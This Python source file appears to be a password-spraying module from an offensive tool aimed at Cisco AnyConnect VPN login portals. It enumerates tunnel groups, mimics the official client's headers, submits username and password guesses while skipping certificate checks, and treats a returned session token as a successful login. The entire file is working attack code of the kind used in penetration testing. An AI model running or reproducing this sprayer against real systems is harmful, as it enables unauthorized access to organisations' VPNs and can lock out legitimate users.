import logging
import requests
from contextlib import suppress
from .base import BaseSprayModule

log = logging.getLogger('trevorspray.sprayers.anyconnect')

class AnyConnect(BaseSprayModule):

    body_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="auth-reply">
  <version who="vpn">4.10.01075</version>
  <device-id>win</device-id>
  {groupxml}
  <auth>
    <username>{username}</username>
    <password>{password}</password>
  </auth>
  <group-select>{group}</group-select>
</config-auth>'''
    
    body_plain = 'group_list={group}&username={username}&password={password}&secondary_username=&secondary_password='

    headers_xml = {
        'User-Agent': 'AnyConnect Windows 4.10.01075',
        'Accept-Encoding': 'gzip, deflate',
        'X-Transcend-Version': '1',
        'X-Aggregate-Auth': '1',
        'X-AnyConnect-Platform': 'win',
        'X-Support-HTTP-Auth': 'true',
        'Content-Type': 'application/xml; charset=utf-8'
    }

    headers_plain = {
        'User-Agent': 'AnyConnect Windows 4.10.01075',
        'Cookie': 'webvpnlogin=1',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate',
        'X-Transcend-Version': '1',
        'X-Support-HTTP-Auth': 'true',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    def initialize(self):

        from lxml import etree

        url = self.url + ('/' if not self.url.endswith('/') else '')

        s = requests.Session()
        log.debug(f'POST {url}')
        initial_response = s.post(
            url,
            headers=self.headers_xml,
            data=f'''<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="init">
  <version who="vpn">4.10.01075</version>
  <device-id>win</device-id>
  <group-access>{self.url}</group-access>
</config-auth>''',
            allow_redirects=False,
            verify=False
        )

        log.debug(f'{initial_response}: {initial_response.content}')

        tunnelgroups = {}
        selected_tunnelgroup = None

        # XML auth
        if initial_response.status_code == 200:
            self.auth_type = 'xml'
            log.info('Detected XML auth')
            self.request_data = self.body_xml
            self.headers = self.headers_xml
            try:
                parsed_initial_response = etree.fromstring(initial_response.content)
            except Exception as e:
                log.error(f'Error parsing content: {e}, {initial_response.content}')
                return False
            for tunnelgroup in parsed_initial_response.iterfind('.//opaque'):
                group = tunnelgroup.find('tunnel-group').text,
                groupname = tunnelgroup.find('group-alias').text
                if group and groupname:
                    tunnelgroups[groupname] = {
                        'group': group,
                        'groupxml': etree.tostring(tunnelgroup).decode(),
                        'groupname': groupname
                    }

        # plain auth
        elif initial_response.status_code in (301, 302):
            self.auth_type = 'plain'
            self.request_data = self.body_plain
            self.headers = self.headers_plain
            host = '/'.join(initial_response.url.split('/', 3)[:3])
            self.url = host + initial_response.headers['Location']
            log.info(f'Detected plain auth, redirecting to {self.url}')
            log.debug(f'POST {self.url}')
            plain_response = s.get(
                self.url,
                headers={
                    'User-Agent': 'AnyConnect Windows 4.10.01075',
                    'Accept': '*/*',
                    'Accept-Encoding': 'gzip, deflate',
                    'X-Transcend-Version': '1',
                    'X-Support-HTTP-Auth': 'true',
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                verify=False
            )
            try:
                parsed_plain_response = etree.fromstring(plain_response.content)
            except Exception as e:
                log.error(f'Error parsing content: {e}, {plain_response.content}')
                return False
            for option in parsed_plain_response.iterfind('.//option'):
                group = option.attrib.get('value', '')
                groupname = option.text
                if group and groupname:
                    tunnelgroups[groupname] = {
                        'group': group,
                        'groupname': groupname
                    }

        else:
            log.error(f'Received invalid response code "{initial_response.status_code}" from url: {url}')

        if not tunnelgroups:
            log.error('Failed to enumerate AnyConnect tunnel groups')
            return False
        elif len(tunnelgroups) == 1:
            for alias, tunnelgroup in tunnelgroups.items():
                selected_tunnelgroup = tunnelgroup
                log.info(f'Found tunnel group "{alias}"')
        else:

            while selected_tunnelgroup is None:
                try:
                    tunnelgroup = tunnelgroups[self.globalparams.get('group', None)]
                    selected_tunnelgroup = tunnelgroup
                except KeyError:
                    pass
                try:
                    tunnelgroup = tunnelgroups[input(f'[USER] Select group: [{"|".join(tunnelgroups.keys())}]: ')]
                    selected_tunnelgroup = tunnelgroup
                except KeyError:
                    log.error('Invalid choice.')
                log.debug(f'Using tunnel group {selected_tunnelgroup["groupname"]}:')
                for k,v in selected_tunnelgroup.items():
                    log.debug(f'    {k}: {v}')

        log.info(f'Using tunnel group "{selected_tunnelgroup["groupname"]}"')
        self.globalparams.update(selected_tunnelgroup)

        return True


    def check_response(self, response):

        from lxml import etree

        valid = False
        exists = None
        locked = None
        msg = 'Login failed.'

        log.debug(f'Response: {response.content}')

        parsed_response_content = etree.fromstring(response.content)
        for error in parsed_response_content.iterfind('.//error'):
            msg = error.text

        session_token = ''
        with suppress(Exception):
            session_token = parsed_response_content.find('.//session-token').text

        if len(session_token) > 10:
            exists = True
            valid = True
            msg = f'SESSION TOKEN: {session_token}'

        return (valid, exists, locked, msg)
